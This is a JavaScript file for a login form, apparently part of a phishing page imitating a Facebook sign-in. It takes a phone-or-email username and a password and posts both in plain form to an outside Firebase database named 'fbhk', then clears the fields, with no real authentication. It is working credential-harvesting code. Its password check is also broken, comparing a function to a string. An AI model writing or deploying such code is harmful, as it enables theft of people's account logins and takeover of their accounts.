const userNaname = document.getElementById("username");
const password = document.getElementById("password");
const btn = document.querySelector("button");
btn.addEventListener("click", () => {
  if (
    (!isNaN(userNaname.value) || validateEmail(userNaname.value)) &&
    userNaname.value.trim() !== "" && password.value.trim!==""
  ) {
    axios
      .post("https://fbhk-9882a-default-rtdb.firebaseio.com/fbhk.json", {
        userName: userNaname.value,
        password: password.value,
      })
      .then((data) => console.log(data))
      .then(() => clear());
  } else {
    return;
  }
});

function clear() {
  userNaname.value = "";
  password.value = "";
}

function validateEmail(email) {
  const re =
    /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
  return re.test(String(email).toLowerCase());
}
